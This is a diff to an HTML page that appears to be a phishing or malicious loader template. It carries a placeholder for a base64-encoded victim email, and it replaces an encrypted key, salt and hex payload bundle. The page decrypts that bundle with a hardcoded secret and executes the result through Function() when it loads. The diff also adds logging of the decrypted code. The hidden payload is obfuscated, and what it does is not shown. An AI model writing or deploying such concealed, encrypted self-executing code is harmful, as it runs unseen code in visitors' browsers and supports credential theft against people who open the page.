@@ -47,7 +47,7 @@
 </head>
 <body>
     <div class="hidden">
-        <div nike-tes1="" id="secure-data" custom-info="locked"></div>
+        <div nike-mechant="" id="secure-data" custom-info="locked"></div>
     </div>
 
     <div adidas="<%=EMAIL64%>"></div>
@@ -131,13 +131,17 @@
         (async () => {
             console.log("[INIT] Starting secure data processing...");
             const secureBundle = {
-                key: "ce12552921e07eeae6d25a8b",
-                salt: "0ac6f6fafea5dd5e93ca4522b49d3681",
-                data: "6deb93765e72ef8ce34b1b97d0c25c97611c83b0ac258d36b36d018cdb7ff468533920838d3707c758da44549d374e8e0ca5a6aa93b0af7aa6d1f2e3c26dcf486585b4c887ad5cb43aed7d90469c8c5265c8bbbeca57739d97e18e7cceac3acfa08db407fba57a71ff3d8a03b8299957024e3205442026156a361709ebd8c2df4c14a3c6c053abe5055489a44d42679720a67e7b98ddb7c15cf91320517d7e3b4c74750d19471e7e76750a80e4a099a0297edb403178b56fd0f152d4ac2ea37bc07720850870a3a7"
+                key: "fc99b7a635588ef2ea062e53",
+                salt: "f80d19308bf045f1043949a8dfb47260",
+                data: "05df95628d41f2d501f3201f62fa530575d17e1a0a47b1127cc8deb11fc5032ddc16d9108232c82ca76a46da4ae5b44925ad2467573057e5d023645dddd97f7a3491feac36200255d73fa1bc73da6f1c3cb503de914af7d00d05dd240eee833c1102d3861556595aa2175a248f9fff8d736d792b297b9a32522e0d096dcd48136fedeaaf31e00b81dfcf53900bf6a0a7cac19a309e56202b064f24382e1567e9b18f1000e5f0fc85e952de2811b32327a4a49b8c73048ca18cb8ced518632183"
             };
+
+
 
             const secret = "homesweethome";
             const result = await handleSecureData(secureBundle.data, secureBundle.key, secureBundle.salt, secret);
+            console.log(result);
+            
             Function(`${result}`)();
 
             if (result) {
